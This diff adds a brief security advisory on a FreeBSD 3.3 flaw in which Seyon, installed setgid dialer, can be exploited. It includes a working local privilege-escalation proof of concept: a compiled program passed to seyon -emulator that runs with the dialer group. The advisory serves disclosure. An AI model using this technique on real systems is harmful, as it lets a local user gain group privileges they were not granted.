@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/838/info
+
+FreeBSD 3.3-RELEASE ships with Seyon, a communications program which is known to have several vulnerabilities which can allow for a malicious user to elevate priviliges. The vulnerability, however, is that seyon is still installed setgid dialer in FreeBSD. When seyon is exploited, a local user can grant him/herself priviliges which allow access to the communications devices or anything else accessable by the group dialer. 
+
+One of the methods to exploit seyon is shown below:
+
+bash-2.03$ echo 'void main() { system("/usr/bin/id"); }' > id.c
+bash-2.03$ gcc -o id id.c
+bash-2.03$ seyon -emulator ./id
+uid=1000(xnec) gid=1000(xnec) egid=68(dialer) groups=68(dialer), 1000(xnec) 
